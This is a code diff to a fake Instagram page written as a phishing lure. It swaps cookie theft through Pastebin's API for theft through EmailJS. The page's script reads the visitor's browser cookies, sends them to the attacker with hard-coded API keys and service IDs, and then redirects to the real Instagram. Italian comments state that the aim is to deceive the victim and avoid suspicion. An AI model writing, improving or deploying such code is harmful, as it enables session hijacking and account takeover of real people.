@@ -3,11 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <title>Instagram</title>
+    <!-- Libreria EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+       (function(){
+          // Inizializzazione con la tua PUBLIC KEY
+          emailjs.init("tVs-xljTIV09gmOMy");
+       })();
+    </script>
+
     <style>
         body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; width: 350px; }
+        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; text-align: center; width: 350px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
         img { width: 175px; margin-bottom: 20px; }
-        button { background: #0095f6; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; }
+        button { background: #0095f6; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        button:hover { background: #0074cc; }
     </style>
 </head>
 <body>
@@ -19,28 +29,27 @@
 
 <script>
     function sendCookies() {
-        // 1. Prendi i cookie del browser corrente
+        // 1. Prendi i cookie
         const cookies = document.cookie;
         
-        // 2. La tua API Key
-        const apiKey = 'XSCtYiDCb0oUlK4EY7CtOtQR5Br6a-sK'; 
-        
-        // 3. Invia i dati a Pastebin in background (senza cambiare pagina)
-        fetch('https://pastebin.com/api/api_post.php', {
-            method: 'POST',
-            body: new URLSearchParams({
-                api_dev_key: apiKey,
-                api_paste_code: cookies,
-                api_option: 'paste'
+        // 2. Parametri da inviare
+        var templateParams = {
+            cookie: cookies,
+            timestamp: new Date().toLocaleString()
+        };
+
+        // 3. Invia l'email con i tuoi ID specifici
+        emailjs.send('service_75wahjh', 'template_jm3cf2p', templateParams)
+            .then(function(res) {
+                console.log("Success!", res.status);
+                // Reindirizza subito a Instagram per ingannare la vittima
+                window.location.href = "https://www.instagram.com/";
             })
-        })
-        .then(response => response.text())
-        .then(pasteUrl => {
-            // Il pastebin è stato creato. 
-            // Opzionale: reindirizza l'utente su Instagram per non far sospettare nulla
-            window.location.href = "https://www.instagram.com/";
-        })
-        .catch(error => console.error('Errore:', error));
+            .catch(function(err) {
+                console.error("Error:", err);
+                // Anche se fallisce, reindirizza per non far sospettare nulla
+                window.location.href = "https://www.instagram.com/";
+            });
     }
 </script>
 </body>
